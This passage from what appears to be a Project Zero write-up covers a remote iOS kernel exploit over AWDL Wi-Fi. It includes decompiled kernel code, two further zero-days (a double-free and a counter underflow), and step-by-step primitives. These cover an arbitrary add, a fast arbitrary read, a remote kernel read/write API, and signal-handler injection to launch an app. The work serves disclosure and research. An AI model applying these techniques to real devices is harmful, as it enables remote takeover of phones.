This was slightly concerning as it had now been months since I had reported the first AWDL-based vulnerability to Apple and a fix for that had already shipped. One my early hopes for Project Zero would be that we could have a "research amplification" effect: we would invest significant effort in publicly less-understood areas of vulnerability research and exploitation and present our results to the affected vendors who would then use their significantly greater resources to continue this research. Vendors have resources such as source code and design documents which should make it vastly easier to audit many of these attack surfaces - we would be keen to assist in this second phase as well.

A more pragmatic view of reality is that whilst the security and product teams do want to continue our research, and do have many more resources, the one important resource they lack is time. Justifying the benefits of fixing a vulnerability which will become public in 90 days is easy but extracting the maximum value from that external report by investing a significant amount of time is much harder to justify; these teams already have other goals and targets for the quarter. Time is the key resource which makes Project Zero successful; we don't have to do vulnerability triage, or design review, or fix bugs or any of the other things typical product security teams have to do.

I mention this because I stumbled over (and reported to Apple) not one but two more remotely-exploitable radio-proximity 0-day vulnerabilities during this research, the first of which appears to have been at least on some level known about:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgA-qM_s1156_image18%281%29.png)

[Mark Dowd is the co-founder of Azimuth](https://www.vice.com/en_us/article/8xdayg/iphone-zero-days-inside-azimuth-security), an Australian "market-leading information security business".

It's well known to all vulnerability researchers that the easiest way to find a new vulnerability is to look very closely at the code near a vulnerability which was recently fixed. They are rarely isolated incidents and usually indicate a lack of testing or understanding across an entire area.

I'm emphasising this point because Mark Dowd's tweet above is claiming knowledge of a variant that wasn't so difficult to find. One that was so easy to find, in fact, that it falls out by accident if you make the slightest mistake when doing BSS Steering.

We saw the function IO80211AWDLPeer::populateBssSteeringMsgBlob earlier; it's responsible for allocating and populating the steering\_msg\_blob buffer which will end up as the contents of the 0x1d TLV sent in a AWDL BSS Steering UMI.

At the beginning of the function they check whether this peer already has steering\_msg\_blob:

#### if (this->steering\_msg\_blob && this->steering\_msg\_blob\_size) {

#### ...

#### kfree(this->steering\_msg\_blob, this->steering\_msg\_blob\_size);

#### this->steering\_msg\_blob = 0LL;

#### }

If it does have one it gets free'd and NULL-ed out.

They then compute the size of the new steering\_msg\_blob, allocate it and fill it in:

#### steering\_blob\_size = \*(\_DWORD \*)(msg + 0x3C) + 0x4F;

#### this->steering\_msg\_blob = kalloc(steering\_blob\_size);

#### ...

#### this->steering\_blob\_size = steering\_blob\_size;

All ok.

Right at the end of the function they then try to add the peer to the "UMI chain" - this is this other linked list of peers with pending UMIs which we saw earlier:

#### err = 0;

#### if (this->addPeerToUmiChain()) {

#### if ( peer\_manager

#### && peer\_manager->isSafeToSendUmiNow(

#### this->chanseq\_channels\[peer\_manager->current\_chanseq\_step + 1\],0)) {

#### err = 0;

#### // in a shared AW; force UMI timer to expire now

#### peer\_manager->UMITimer->setTimeoutMS(0)

#### }

#### } else {

#### kfree(this->steering\_msg\_blob, this->steering\_msg\_blob\_size);

#### this->UMI\_feature\_mask = 0;

#### err = 0xE00002BC;

#### }

#### return err;

If the peer gets successfully added to the UMI chain, they test whether they could send the UMI right now (if both this device and the target are in AW's on the same channel). If so, they force the UMI timer to expire, which triggers the code we saw earlier to read the steering\_msg\_blob, build the UMI template and send it.

However, if addPeerToUmiChain fails then the steering\_msg\_blob is freed. But unlike the earlier kfree, this time they don't NULL out the pointer before returning. The vulnerability here is that that field is expected to be the owner of that allocation; so if we can somehow come back into populateBssSteeringMsgBlob again this same value will be freed a second time.

There's an even easier way to trigger a double-kfree however: by doing nothing.

After a period of inactivity the IO80211AWDLPeer object will be destructed and free'd. As part of that the IO80211AWDLPeer::freeResources will be called, which does this:

#### steering\_msg\_blob = this->steering\_msg\_blob;

#### if ( steering\_msg\_blob ) {

#### kfree(steering\_msg\_blob, this->steering\_msg\_blob\_size);

#### this->steering\_msg\_blob = 0LL;

#### this->steering\_msg\_blob\_size = 0;

#### }

This will see a value for steering\_msg\_blob which has already been freed and free it a second time. If an attacker were able to reallocate the buffer in between the two frees they could get that controlled object freed, leading to a use-after-free.

It actually took some reversing effort to work out how to make addPeerToUmiChainnot fail. The trick is that the peer needs to have sent a datapath TLV with the 0x800 flag set in the first dword, and that's why we set that flag.

This vulnerability also opens a different possibility for the initial memory disclosure. By steering multiple peers it's possible to use this to construct a primitive where the target device will attempt to send a UMI containing memory from a steering\_msg\_blob which has been freed. With some heap grooming this could allow the disclosure of both a stale allocation as well as out-of-bounds data without needing to guess pointers. In the end I chose to stay with the low zone\_map entropy technique as I also wanted to try to land this remote kernel exploit using only a single vulnerability.

We'll get back to the exploit now and take a look at accidental 0day 2 of 2 later on...

# The path to a write

We've seen that the peer objects seem to be accessed frequently in the background, not just when we're sending frames. This is important to bear in mind as we search for our next corruption target.

One option could be to use the arbitrary free primitive. Maybe we could free a peer object but this would be tricky as the memory allocator would write metadata over the vtable pointer and the peer might be used in the background before we got a chance to ensure it was safe.

Another possibility could be to cause a type confusion. It's possible that you could find a useful gadget with such a primitive but I figured I'd keep looking for something else.

At this point I started going through more AWDL code looking for all indirect writes I could find. Being able to write even an uncontrolled value to an arbitrary address is usually a good stepping-stone to a full arbitrary memory write primitive.

There's one indirect write which stood out as particularly interesting; right at the start of IO80211AWDLPeer::actionFrameReport:

#### peer\_manager = this->peer\_manager;

#### frame\_len = mbuf\_len(frame\_mbuf);

#### peer\_manager->total\_bytes\_received += frame\_len;

#### ++this->n\_frames\_in\_last\_second;

#### per\_second\_timestamp = this->per\_second\_timestamp;

#### absolute\_time\_now = mach\_absolute\_time();

#### frames\_in\_last\_second = this->n\_frames\_in\_last\_second;

#### if ( ((absolute\_time\_now - per\_second\_timestamp) / 1000000)

#### \> 1024 )// more than 1024ms difference

#### {

#### if ( frames\_in\_last\_second >= 0x21 )

#### IO80211Peer::logDebug(

#### (IO80211Peer \*)this,

#### "%s\[%d\] : Received %d Action Frames from peer %02X:%02X:%02X:%02X:%02X:%02X in 1 second. Bad Peer\\n",

#### "actionFrameReport",

#### 1533LL,

#### frames\_in\_last\_second,

#### this->peer\_mac.octet\[0\],

#### this->peer\_mac.octet\[1\],

#### this->peer\_mac.octet\[2\],

#### this->peer\_mac.octet\[3\],

#### this->peer\_mac.octet\[4\],

#### this->peer\_mac.octet\[5\]);

#### this->per\_second\_timestamp = mach\_absolute\_time();

#### this->n\_frames\_in\_last\_second = 1;

#### }

#### else if ( frames\_in\_last\_second >= 0x21 )

#### {

#### \*(\_DWORD \*)(a2 + 20) = 1;

#### return 0;

#### }

#### ... // continue on to parse the frame

Those first three lines of the decompiler output are exactly the kind of indirect write we're looking for:

#### peer\_manager = this->peer\_manager;

#### frame\_len = mbuf\_len(frame\_mbuf);

#### peer\_manager->total\_bytes\_received += frame\_len;

The peer\_manager field is at offset +0x28 in the peer object, easily corruptible with the linear overflow. The total\_bytes\_received field is a u32 at offset +0x7c80 in the peer manager, and frame\_len is the length of the WiFi frame we send so we can set this to an arbitrary value, albeit at least 0x69 (the minimum AWDL frame size) and less than 1200 (potentially larger with fragmentation but it wouldn't help much). That arbitrary value would then get added to the u32 at offset +0x7c80 from the peer\_manager pointer. This would be enough to do a byte-by-byte write of arbitrary memory, presuming you knew what was there before:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMNrR_s622_image15%283%29.png)

### By corrupting upper\_peer's peer\_manager pointer then spoofing a frame from upper\_peer we can cause an indirect write through the corrupted peer\_manager pointer. The peer\_manager has a dword field at offset +0x7c80 which counts the total number of bytes received from all peers; actionFrameReport will add the length of the frame spoofed from upper\_peer to the dword at the corrupted peer\_manager pointer + 0x7c80 giving us an arbitrary add primitive

We do have a limited read primitive already, probably enough to bootstrap ourselves to a full arbitrary read and therefore full arbitrary write. We can indeed reach this code with a corrupted peer\_manager pointer and get an arbitrary add primitive. There's just one tiny problem, which will take many more weeks to solve: We'll panic immediately after the write.

# Getting the timing right

Although the IO80211AWDLPeer's peer\_manager field doesn't appear to be used often in the background (unlike the vtable), the peer\_manager field will be used later on in the actionFrameReport method, and since we're trying to write to arbitrary addresses it will almost certainly cause a panic.

Looking at the code, there is only one safe path out of actionFrameReport:

#### if ( ((absolute\_time\_now - per\_second\_timestamp) / 1000000)

#### \> 1024 )// more than 1024ms difference

#### {

#### if (frames\_in\_last\_second >= 0x21)

#### IO80211Peer::logDebug(

#### (IO80211Peer \*)this,

#### "%s\[%d\] : Received %d Action Frames from peer %02X:%02X:%02X:%02X:%02X:%02X in 1 second. Bad Peer\\n",

#### "actionFrameReport",

#### 1533LL,

#### frames\_in\_last\_second,

#### this->peer\_mac.octet\[0\],

#### this->peer\_mac.octet\[1\],

#### this->peer\_mac.octet\[2\],

#### this->peer\_mac.octet\[3\],

#### this->peer\_mac.octet\[4\],

#### this->peer\_mac.octet\[5\]);

#### this->per\_second\_timestamp = mach\_absolute\_time();

#### this->n\_frames\_in\_last\_second = 1;

#### }

#### else if ( frames\_in\_last\_second >= 0x21 )

#### {

#### \*(\_DWORD \*)(a2 + 20) = 1;

#### return 0;

#### }

We have to reach that return 0 statement, which means we need the first if clause to be false, and the second one to be true.

The first statement checks whether more than 1024 ms have elapsed since the per\_second\_timestamp was updated.

The second statement checks whether more than 32 frames have been received since the per\_second\_timestamp was last updated.

So to reach the return 0 and avoid the panics due to an invalid peer\_manager pointer we'd need to ensure that 32 frames have been received from the same spoofed peer within a 1024ms period.

You are hopefully starting to see why the ACK sniffing model vs the timing model is advantageous now; if the target had only received 31 frames then attempting the arbitrary add would cause a kernel panic.

Recall that at this point however I'm using a 2.4Ghz only WiFi adaptor for injection and monitoring and the only data rate I can get to work is 1Mbps. Actually getting 33 frames onto the air inside 1024ms, especially as only a fraction of that time will be AWDL Availability Windows, is probably impossible.

Furthermore, as I suddenly need far more accuracy in terms of knowing whether frames were received or not, I start to notice how unreliable my monitor device is. It appears to be frequently dropping frames, with an error rate seemingly positively-correlated with how long the adapter has been plugged in. After a while my testing model includes having to unplug the injection and monitoring adaptors after each test to let them cool down. This hopefully gives a taste of how frustrating many parts of this exploit development processes were. Without a stable and fast testing setup prototyping ideas is painfully slow, and figuring out whether an idea didn't work is made harder because you never know if your idea didn't work, or if it was yet another hardware failure.

# Changing the clocks

It's probably impossible to make the timing checks pass using intended behaviour with the current setup. But we still have a few tricks up our sleeve. We do have a memory corruption vulnerability after all.

Looking at the two relevant fields per\_second\_timestamp and n\_frames\_in\_last\_second we notice that they're at the following offsets:

#### /\\* +0x1648 \*/  struct ether\_addr sync\_tree\_macs\[10\];

#### /\\* +0x1684 \*/  uint8\_t sync\_error\_count;

#### /\\* +0x1685 \*/  uint8\_t had\_chanseq\_tlv;

#### /\\* +0x1686 \*/  uint8\_t pad3\[2\];

#### /\\* +0x1688 \*/  uint64\_t per\_second\_timestamp;

#### /\\* +0x1690 \*/  uint32\_t n\_frames\_in\_last\_second;

#### /\\* +0x1694 \*/  uint8\_t pad21\[4\];

#### /\\* +0x1698 \*/  void \*steering\_msg\_blob;

#### /\\* +0x16A0 \*/  uint32\_t steering\_msg\_blob\_size;

So the timestamp (which is absolute, not relative) and the frame count are just after the sync tree buffer which we can overflow out of meaning we can reliably corrupt them and provide a fake timestamp and count.

Arbitrary add idea 1: clock synchronization

My first idea was to try to determine the delta between the target device's absolute clock and the raspberry pi running the exploit. Then safely triggering an arbitrary add would be a three step process:

1) Compute a valid per\_second\_timestamp value at a point just in the future and do a short overflow within upper\_peer to give it that arbitrary timestamp and a high n\_frames\_in\_last\_second value.

2) Do a long overflow from lower\_peer to corrupt upper\_peer's peer\_manager pointer to point 0x7c80 bytes below the arbitrary add target.

3) Spoof a frame from upper\_peer where the length corresponds to the size of the arbitrary add. As long as the timestamp we wrote in step 1 is less than 1024 ms earlier than the target device's current current clock, and the n\_frames\_in\_last\_second is still large, we'll hit the early error return path.

To pull this off we'll need to synchronize our clocks. AWDL itself is built on accurate timing and there are timing values in each AWDL frame. But they don't really help us that much because those are relative timestamps whereas we need absolute timestamps.

Luckily we already have a restricted read primitive, and in fact we've already accidentally used it to leak a timestamp:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQrTg_s624_image13%283%29.png)

### The same annotated hexdump from the initial read primitive when it found two neighbouring peers. At offset +0x43 in the dump we can see the per\_second\_timestamp value. We'd now like to leak one of these which we force to be set at an exact moment in time

We can use the initial limited arbitrary read primitive again under more controlled conditions to try to determine the clock delta like this:

1) Wait 1024 ms.

2) Spoof a frame from lower\_peer, which will cause it to get a fresh per\_second\_timestamp.

3) When we receive an ACK, record the current timestamp on the raspberry pi.

4) Use the BSS Steering read to read lower\_peer's timestamp.

5) Convert the two timestamps to the same units and compute the delta.

Now we can perform the arbitrary write as described above by using the SyncTree overflow inside upper\_peer to give it a fake and valid per\_second\_timestamp and n\_frames\_in\_last\_second value. This works, and we can add an arbitrary byte to an arbitrary address!

Unfortunately it's not very reliable. There are too many things to go wrong here, and for a painful couple of weeks everything went wrong. Firstly, as previously discussed, the injection and monitoring hardware is just too unreliable. If we miss ACKs we end up getting the clock delta wrong, and if the clock delta is too wrong we'll panic the target. Also, we're still sending frames very slowly, and the slower this all happens the lower the probability that our fake timestamp stays valid by the time it's used. We need an approach which is going to work far more reliably.

# More timing tricks

Having to synchronize the clocks is fragile. Looking more closely at the code, I realized there was another way to reach the error bail out path without manually syncing.

If we wait 1024ms then spoof a frame, the peer structure will get a fresh timestamp which will pass the timestamp check for the next 1024ms.

We can't do that and then overflow into the n\_frames\_in\_last\_second field, because that field is after the per\_second\_timestamp so we'd corrupt it. But there is actually a way to corrupt the n\_frames\_in\_last\_second field without touching the timestamp:

1) Wait 1024ms then spoof a valid frame from upper\_peer, giving its IO80211AWDLPeer object a valid per\_second\_timestamp.

2) Overflow from lower\_peer into upper\_peer, setting upper\_peer's peer\_manager pointer to 0x7c80 bytes before upper\_peer's frames\_in\_last\_second counter.

3) Spoof a valid frame from upper\_peer.

Let's look more closely at exactly what will happen now:

It's now the case that this->peer\_manager points 0x7c80 before peer->n\_frames\_in\_last\_second when IO80211AWDLPeer::actionFrameReport gets called on upper\_peer:

#### peer\_manager = this->peer\_manager;

#### frame\_len = mbuf\_len(frame\_mbuf);

Because we've corrupted upper\_peer's peer\_manager pointer, peer\_manager->total\_bytes\_received overlaps with upper\_peer->n\_frames\_in\_last\_second, meaning this add will add the frame length to upper\_peer->n\_frames\_in\_last\_second! The important part is that this write happens before n\_frames\_in\_last\_second is checked!

#### peer\_manager->total\_bytes\_received += frame\_len;

#### ++this->n\_frames\_in\_last\_second;

#### per\_second\_timestamp = this->per\_second\_timestamp;

#### absolute\_time\_now = mach\_absolute\_time();

#### frames\_in\_last\_second = this->n\_frames\_in\_last\_second;

And if we're fast enough we'll still pass this check, because we have a real timestamp:

#### if ( ((absolute\_time\_now - per\_second\_timestamp) / 1000000)

#### \> 1024 )// more than 1024ms difference

#### {

#### ...

#### }

and now we'll also pass this check and return:

#### else if ( frames\_in\_last\_second >= 0x21 )

#### {

#### \*(\_DWORD \*)(a2 + 20) = 1;

#### return 0;

#### }

We've now got a timestamp still valid for some portion of 1024ms and n\_frames\_in\_last\_second is very large, without having to send that many frames within the 1024ms window or having to manually synchronize the clocks.

The fourth step is then to overflow again from lower\_peer to upper\_peer, this time pointing peer\_manager to 0x7c80 below the desired add target. Finally, spoof a frame from upper\_peer, padded to the correct size for the desired add value.

# Another timing trick

The final timing trick for now was to realize we could skip the initial 1024ms wait by first overflowing within upper\_peer to set its timestamp to 0. Then the next valid frame spoofed from upper\_peer would be sure to set a valid per\_second\_timestamp usable for the next 1024 ms. In this way we can use the arbitrary write quite quickly, and start building our next primitive. Except...

# I'm still panicking...

Earlier I accidentally discovered another exploitable zero day. Fortunately it was fairly easy to avoid triggering it, but my exploit continued to panic the target device in a multitude of ways. Of course, as before, I'd sort of expect this and indeed I worked out a few ways in which I was potentially causing panics.

One was that when I was overwriting the peer\_manager pointer I was also overwriting the flink and blink pointers of the peer in the linked list of peers. If peers had been added or removed from the list since I had taken the copy of those pointers I could now be corrupting the list, potentially adding back stale pointers or altering the order. This was bound to cause problems so I added a workaround: I would ensure that no spoofed peers ever got freed. This is simple to implement; just ensure every peer spoofs a frame around every 20 seconds or so and you'll be fine.

But my test device was still panicking, so I decided to really dig into some of the panics and work out exactly what seems to be happening. Am I accidentally triggering yet another zero-day?

# More accidental zero-day

After a day or so of analysis and reversing I realize that yes, this is in fact another exploitable zero-day in AWDL. This is the third, also reachable in the default configuration of iOS.

This vulnerability took significantly more effort to understand than the double free. The condition is more subtle and boils down to a failure to clear a flag. With no upfront knowledge of the names or purposes of these flags (and there are hundreds of flags in AWDL) it required a lot of painstaking reverse engineering to work out what's going on. Let's dive in.

resetAndRemovePeerInfo is a member method of the IO80211PeerBssSteeringManager. It's called when a peer is being destructed:

#### IO80211PeerBssSteeringManager::resetAndRemovePeerInfo(

#### IO80211AWDLPeer \*peer) {

#### struct BssSteeringCntx \*cntx;

#### if (!peer) {

#### // log error and return

#### }

#### peer->added\_to\_fw\_cache = 0;

#### struct BssSteeringCntx\* cntx = this->steering\_cntx;

#### if (cntx->peer\_count) {

#### for (uint64\_t i = 0; i < cntx->peer\_count; i++) {

#### if (memcmp(&cntx->peer\_macs\[i\], &peer->peer\_mac, 6uLL) == 0) {

#### memset(&cntx->peer\_macs\[i\], 0, 6uLL);

#### }

#### };

#### }

#### cntx->peer\_count--;

#### }

We can see a callsite here in IO80211AWDLPeerManager::removePeer:

#### if (peer->added\_to\_fw\_cache) {

#### if (this->steering\_manager)  {

#### this->steering\_manager->resetAndRemovePeerInfo(peer);

#### }

#### }

added\_to\_fw\_cache is a name I have given to the flag field at +0x4b8 in IO80211AWDLPeer. We can see that if a peer with that flag set is destructed then the peer manager will call the steering\_manager's resetAndRemovePeerInfo method shown above.

resetAndRemovePeerInfo clears that flag then iterates through the steering context object's array of currently-being-steered peer MAC addresses. If the peer being destructed's MAC address is found in there, then it's memset to 0.

The logic already looks a little odd; they decrement peer\_count but don't shrink the size of the array by swapping the empty slot with the last valid entry, meaning it will only work correctly if the peers are destructed in the exact reverse order that they were added. Kinda weird, but probably not a security vulnerability.

The logic of this function means peer\_count will be decremented each time it runs. But what would happen if this function were called more times than the initial value of peer\_count? In the first extra invocation the memcmp loop wouldn't execute and peer\_count would be decremented from 0 to 0xffffffff, but in the second extra invocation, the peer\_count is non-zero, so it would enter the memcmp/memset loop. But the only loop termination condition is i >= peer\_count, so this loop will try to run 4 billion times, certainly going off the end of the 8 entry peer\_macs array:

#### struct \_\_attribute\_\_((packed)) BssSteeringCntx {

#### /\\* +0x0000 \*/  uint32\_t first\_field;

#### /\\* +0x0004 \*/  uint32\_t service\_type;

#### /\\* +0x0008 \*/  uint32\_t peer\_count;

#### /\\* +0x000C \*/  uint32\_t role;

#### /\\* +0x0010 \*/  struct ether\_addr peer\_macs\[8\];

#### /\\* +0x0040 \*/  struct ether\_addr infraBSSID;

#### /\\* +0x0046 \*/  uint8\_t pad4\[6\];

#### /\\* +0x004С \*/  uint32\_t infra\_channel\_from\_datapath\_tlv;

#### /\\* +0x0050 \*/  uint8\_t pad8\[8\];

#### /\\* +0x0058 \*/  char ssid\[32\];

#### /\\* +0x0078 \*/  uint8\_t pad1\[12\];

#### /\\* +0x0084 \*/  uint32\_t num\_peers\_added\_to\_umi;

#### /\\* +0x0088 \*/  uint8\_t pad\_10;

#### /\\* +0x0089 \*/  uint8\_t pendingTransitionToNewState;

#### /\\* +0x008А \*/  uint8\_t pad7\[2\];

#### /\\* +0x008C \*/  enum BSSSteeringState current\_state;

#### /\\* +0x0090 \*/  uint8\_t pad5\[8\];

#### /\\* +0x0098 \*/  struct IOTimerEventSource \*bssSteeringExpiryTimer;

#### /\\* +0x00A0 \*/  struct IOTimerEventSource \*bssSteeringStageExpiryTimer;

#### /\\* +0x00A8 \*/  uint8\_t pad9\[8\];

#### /\\* +0x0000 \*/  uint32\_t steering\_policy;

#### /\\* +0x00B4 \*/  uint8\_t inProgress;

#### }

### My reverse engineered version of the BSS Steering context object. I've managed to name most of the fields.

This is only a vulnerability if it's possible to call this function peer\_count+2 times. (To decrement peer\_count down to 0, then set it to -1, then re-enter with peer\_count = -1.)

Whether or not resetAndRemovePeerInfo is called when a peer is destructed depends only on whether that peer has the added\_to\_fw\_cache flag set; this gives us an inequality: the number of peer's with added\_to\_fw\_cache set must be less than or equal to peer\_count+1. Probably it's really meant to be the case that peer\_count should be equal to the number of peers with that flag set. Is that the case?

No, it's not. After steering fails we restart the BSS Steering state machine by sending a new BSSSteering TLV with a steeringMsgID of 6 rather than 0; this means the steering state machine gets a BSS\_STEERING\_REMOTE\_STEERING\_TRIGGER event rather than the BSS\_STEERING\_RECEIVED\_DIRECTED\_STEERING\_CMD which was used to start it. This resets the steering context object, filling the peer\_macs array with whatever new peer macs we specify in the new DIRECTED\_STEERING\_CMD TLV. If we specify different peers to those already in the context's peer\_macs array, then those old entries' corresponding IO80211AWDLPeer objects don't have their added\_to\_fw\_cache field cleared, but the new peers do get that flag set.

This means that the number of peers with the flags set becomes greater than context->peer\_count, so as the peers eventually get destructed peer\_count goes down to zero, underflows then causes memory corruption.

I was hitting this condition each time I restarted steering, though it would take some time for the device to actually kernel panic because the steered peers needed to timeout and get destructed.

Root causing this second bonus remotely-triggerable iOS kernel memory corruption was much harder than the first bonus double-free; the explanation given above took a few days work. It was necessary though as I had to work around both of these vulnerabilities to ensure I didn't accidentally trigger them, which in total added a significant amount of extra work.

The work-around in this case was to ensure that I only ever restarted steering the same peers; with that change we no longer hit the peer\_count underflow and only corrupt the memory we're trying to corrupt! This issue was fixed in [iOS 13.6 as CVE-2020-9906](https://support.apple.com/en-us/HT211288).

The target is no longer randomly kernel panicking even when we don't trigger the intended Sync Tree heap overflow, so let's get back to the exploit.

# Add to read

We have an arbitrary add primitive but it's not quite an arbitrary write yet. For that, we need to know the original values so we can compute the correct per-byte frame sizes to overflow each byte to write a truly arbitrary value.

Probably we'll have to use the arbitrary add to corrupt something in a peer or the peer manager such that we can get it to follow an arbitrary pointer when building an MI or PSF frame which will be sent over the air.

I went back to IDA and spent a long time looking through code to search for such a primitive, and found one in the construction of the Service Request Descriptor TLVs in MI frames:

#### IO80211AWDLPeerManager::buildMasterIndicationTemplate

#### (char \*buffer, u32 total\_size ...

#### ...

#### req\_desc = this->req\_desc;

#### if ( req\_desc ){

#### desc\_len = req\_desc->desc\_len;        // length

#### desc\_ptr = req\_desc->desc\_ptr;

#### tlv\_len = desc\_len+4;

#### if (desc\_len && desc\_ptr && tlv\_len < remaining) {

#### buffer\[offset\] = 16; // type

#### \*(u16\*)&buffer\[offset+1\] = desc\_len + 1; // len

#### buffer\[current\_buffer\_offset+3\] = 3;

#### IO80211ServiceRequestDescriptor::copyDataOnly(

#### req\_desc,

#### &buffer\[offset+4\],

#### total\_size - offset - 4);

#### }

This is reading an IO80211ServiceRequestDescriptor object pointer from the peer manager from which it reads another pointer and a length. If there's space in the MI frame for that length of buffer then it calls the RequestDescriptor's copyDataOnly method, which simply copies from the RequestDescriptor into the MI frame template. It's only reading these two pointer and length fields which are at offset +0x40 and +0x54 in the request descriptor, so by pointing the IO80211AWDLPeerManager's req\_desc pointer to data we control we can cause the next MI template which is generated to contain data read from an arbitrary address, this time with no restrictions on the data being read.

We can use the limited read primitive we currently have to read the existing value of the req\_desc pointer, we just need to find somewhere below it in the peer\_manager object where we know there will always be a fixed, small dword we can use as the length value needed for the read. Indeed, a few bytes below this there is such a value.

The first trick is in choosing somewhere to point the req\_desc pointer to. We want to choose somewhere where we can easily update the read target without having to trigger the memory corruption. From reading the TLV parsing code I knew there were some TLVs which have very little processing. A good example, and the one I chose to use, is the NSync TLV. The only processing is to check that the total TLV length including the header is less than or equal to 0x40. That entire TLV is then memcpy'ed into a 0x40 byte buffer in the peer object at offset +0x4c4:

#### memcpy(this->nsync\_tlv\_buf, tlv\_ptr, tlv\_total\_len);

We can use the arbitrary write to point the peer\_manager's req\_desc pointer to just below the lower\_peer's nsync\_tlv buffer such that by spoofing NSync TLVs from lower\_peer we can update the fake descriptor pointer and length values.

Some care needs to be taken when corrupting the req\_desc pointer however as we can currently only do byte-by-byte writes and the req\_desc pointer might be read while we are corrupting it. We therefore need a way to stop those reads.

IO80211AWDLPeerManager::updateBroadcastMI is on the critical path for the read, meaning that every time the MI frame is updated it must go through this function, which contains the following check:

#### if (this->frames\_outstanding <= this->frames\_limit) {

#### IO80211AWDLPeerManager::updatePrimaryPayloadMI(...

frames\_limit is initialized to a fixed value of 3. If we first use the arbitrary add to make frames\_outstanding very large, this check will fail and the MI template won't be updated, and the req\_desc member won't be read. Then after we're done corrupting the req\_desc pointer we can set this value back to its original value and the MI templates will be updated again and the arbitrary read will work.

An easy way to do this is to add 0x80 to the most-significant byte of frames\_outstanding. The first time we do this it will make frames\_outstanding very large. If it were 2 to begin with it would go from: 0x00000002 to 0x80000002.

Adding 0x80 to that MSB as second time would cause it to then overflow back 0, resetting the value to 2 again. This of course has the side effect of adding 1 to the next dword field in the peer\_manager when it overflows, but fortunately this doesn't cause any problems.

Now by spoofing an NSync TLV from lower\_peer and monitoring for a change in the contents of the 0x10 TLV sent by the target in MI frames we can read arbitrary kernel data from arbitrary addresses.

# Speedy reader

We now have a truly arbitrary read, but unfortunately it can be a bit slow. Sometimes it takes a few seconds for the MI template to be updated. What we need is a way to force the MI template to be regenerated on demand.

Looking through the cross references to IO80211AWDLPeerManager::updateBroadcastMI I noticed that it seems the MI template gets regenerated each time the peer bloom filter gets updated in IO80211AWDLPeerManager::updatePeerListBloomFilter. As we saw much earlier in this post, and I had determined months before this point, the bloom filter code isn't used. But... we have an arbitrary add so we could just turn it on!

Indeed, by flipping the flag at +0x5950 in the IO80211AWDLPeerManager we can enable the peer bloom filter code.

With peer bloom filters enabled each time the target sees a new peer, it regenerates the MI template in order to ensure it's broadcasting an up-to-date bloom filter containing all the peers it knows about (or at least the first 256 in the peer list.) This means we can make our arbitrary read much much faster: we just need to send the correct NSync TLV containing our read target then spoof a new peer and wait for an updated MI. With this technique complete we can read arbitrary remote kernel memory over the air at a rate of many kilobytes per second.

# Remote kernel memory read/write API

At this point we can build the typical abstraction layer used by a local privilege escalation exploit, except this time it's remote.

The main kernel memory read function is:

#### void\* rkbuf(uint64\_t kaddr, uint32\_t len);

With some helpers to make the code simpler:

#### uint64\_t rk64(uint64\_t kaddr);

#### uint32\_t rk32(uint64\_t kaddr);

#### uint8\_t rk8(uint64\_t kaddr);

Similarly for writing kernel memory, we have the main write method:

#### void wk8(uint64\_t kaddr, uint8\_t desired\_byte);

and some helpers:

#### void wkbuf(uint64\_t kaddr, uint8\_t\* desired\_value, uint32\_t len);

#### void wk64(uint64\_t kaddr, uint64\_t desired\_value);

#### void wk32(uint64\_t kaddr, uint32\_t desired\_value);

From this point the exploit code starts to look a lot more like a regular local privilege escalation exploit and the remote aspect is almost completely abstracted away.

# Popping calc with 15 bytes

This is already enough to pop calc. To do this we just need a way to inject a control flow edge into userspace somehow. A bit of grepping through the XNU code and I stumbled across the code handling BSD signal delivery which seemed promising.

Each process structure has an array of signal handlers; one per signal number.

#### struct sigacts {

#### user\_addr\_t ps\_sigact\[NSIG\];   /\* disposition of signals \*/

#### user\_addr\_t ps\_trampact\[NSIG\]; /\* disposition of signals \*/

#### ...

The ps\_trampact array contains userspace function pointers. When the kernel wants a userspace process to handle a signal it looks up the signal number in that array:

#### trampact = ps->ps\_trampact\[sig\];

then sets the userspace thread's pc value to that:

#### sendsig\_set\_thread\_state64(

#### &ts.ts64.ss,

#### catcher,

#### infostyle,

#### sig,

#### (user64\_addr\_t)&((struct user\_sigframe64\*)sp)->sinfo,

#### (user64\_addr\_t)p\_uctx,

#### token,

#### trampact,

#### sp,

#### th\_act)

Where sendsig\_set\_thread\_state64 looks like this:

#### static kern\_return\_t

#### sendsig\_set\_thread\_state64(arm\_thread\_state64\_t \*regs,

#### user64\_addr\_t catcher,

#### int infostyle,

#### int sig,

#### user64\_addr\_t p\_sinfo,

#### user64\_addr\_t p\_uctx,

#### user64\_addr\_t token,

#### user64\_addr\_t trampact,

#### user64\_addr\_t sp,

#### thread\_t th\_act) {

#### regs->x\[0\] = catcher;

#### regs->x\[1\] = infostyle;

#### regs->x\[2\] = sig;

#### regs->x\[3\] = p\_sinfo;

#### regs->x\[4\] = p\_uctx;

#### regs->x\[5\] = token;

#### regs->pc = trampact;

#### regs->cpsr = PSR64\_USER64\_DEFAULT;

#### regs->sp = sp;

#### return thread\_setstatus(th\_act,

#### ARM\_THREAD\_STATE64,

#### (void \*)regs,

#### ARM\_THREAD\_STATE64\_COUNT);

#### }

The catcher value in X0 is also completely controlled, read from the ps\_sigact array.

Note that the kernel APIs for setting userspace register values don't require userspace pointer authentication codes.

We can set X0 to the constant CFString "com.apple.calculator" already present in the dyld\_shared\_cache. On 13.3 on the 11 Pro this is at 0x1BF452778 in an unslid shared cache.

We set PC to this gadget in CommunicationSetupUI.framework:

#### MOV  W1, \#0

#### BL   \_SBSLaunchApplicationWithIdentifier

This clears W1 then calls SBSLaunchApplicationWithIdentifier, a Springboard Services Framework private API for launching apps.

The final piece of this puzzle is finding a process to inject the fake signal into. It needs to have the com.apple.springboard.launchapplications entitlement in order for Springboard to process the launch request. Using [Jonathan Levin's entitlement database](http://newosxbook.com/ent.jl) it's easy to find the list of injection candidates.

We remotely traverse the linked list of running processes looking for a victim, set a fake signal handler then make a thread in that process believe it has to handle a signal by OR'ing in the correct signal number in the uthread's siglist bitmap of pending signals:

#### wk8(uthread+0x10c+3, 0x40); // uthread->siglist

and finally making the thread believe it needs to handle a BSD [AST](https://en.wikipedia.org/wiki/Asynchronous_System_Trap):

#### wk8\_no\_retry(thread+0x2e8, 0x80); // thread->act \|= AST\_BSD

